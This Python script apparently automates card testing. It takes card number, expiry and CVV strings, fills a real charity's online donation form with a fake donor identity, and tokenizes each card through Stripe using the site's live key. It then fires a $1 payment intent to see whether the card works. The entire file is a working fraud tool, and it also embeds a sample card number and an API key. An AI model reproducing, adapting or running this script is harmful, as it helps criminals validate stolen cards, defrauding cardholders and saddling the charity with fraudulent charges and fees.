import sys
if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8')
import asyncio
import httpx
import time
import json

async def test_hoshigaki_probe(card_str):
    cc, mes, ano, cvv = [p.strip() for p in card_str.split('|')[:4]]
    if len(ano) == 2:
        ano = "20" + ano
    mes = mes.zfill(2)

    headers_base = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    }

    async with httpx.AsyncClient(follow_redirects=True, verify=False, timeout=25.0) as client:
        print("[*] Step 1: Submitting Donor Info...")
        post1 = {
            "form[name]": "Gabriel Rosa",
            "form[line1]": "123 Allen ST",
            "form[city]": "New York",
            "form[county]": "New York",
            "form[postcode]": "10002",
            "form[country]": "USA",
            "form[phone]": "18019632580",
            "form[email]": "johndoe9981@gmail.com",
            "extras[informed]": "no",
            "stepData": "",
            "stepValue": "1",
        }
        r1 = await client.post("https://www.abaana.org/donate/online", data=post1, headers=headers_base)
        print(f"    Step 1 Status: {r1.status_code}")

        print("[*] Step 2: Selecting Amount ($1 USD)...")
        post2 = {
            "paymentMethod": "card",
            "currency": "USD",
            "amount": "1",
            "project": "Any Project",
            "addFee": "0",
            "adminFee": "",
            "stepValue": "2",
        }
        r2 = await client.post("https://www.abaana.org/donate/online/step2", data=post2, headers=headers_base)
        print(f"    Step 2 Status: {r2.status_code}")

        print("[*] Step 3: Tokenizing on Stripe...")
        post3 = {
            "type": "card",
            "billing_details[name]": "Gabriel Rosa",
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_month]": mes,
            "card[exp_year]": ano,
            "guid": "N/A",
            "muid": "N/A",
            "sid": "N/A",
            "pasted_fields": "number",
            "payment_user_agent": "stripe.js/c5d6d3bd0a; stripe-js-v3/c5d6d3bd0a",
            "time_on_page": "46566",
            "key": "pk_live_51LhtwiGPgaK6ulcPEN1I001VvS0Ke0SlidIqaDopfpahumzL2zhNQsfb8xI4QxelHGy4BbN2Va3hTEK7dtCkbfTO000GXTCC6H",
        }
        r3 = await client.post("https://api.stripe.com/v1/payment_methods", data=post3, headers=headers_base)
        t3 = r3.json()
        pm = t3.get("id")
        print(f"    PaymentMethod ID: {pm}")
        if not pm:
            print(f"    Stripe Token Error: {t3}")
            return

        print("[*] Step 4: Confirming donation...")
        post4 = {
            "do": "donate/online/step3",
            "stripeToken": pm,
            "addGiftAid": "0",
            "gift-aid": "0",
            "cardholder-name": "Gabriel Romero",
            "stepValue": "3",
        }
        r4 = await client.post("https://www.abaana.org/donate/online/confirm", data=post4, headers=headers_base)
        print(f"    Step 4 Status: {r4.status_code}")

        print("[*] Step 5: Executing PaymentIntent on abaana.org...")
        post6 = {"payment_method_id": pm, "site_area": "donation"}
        r6 = await client.post("https://www.abaana.org/stripe-payment-intent", json=post6, headers=headers_base)
        print(f"    Step 5 Status: {r6.status_code}")
        print(f"    Step 5 Response: {r6.text}")

if __name__ == '__main__':
    test_c = sys.argv[1] if len(sys.argv) > 1 else '4033060047342909|08|28|667'
    print(f"=== TESTING HOSHIGAKI.PY ON {test_c} ===")
    start = time.time()
    asyncio.run(test_hoshigaki_probe(test_c))
    print(f"Elapsed: {round(time.time() - start, 2)}s")
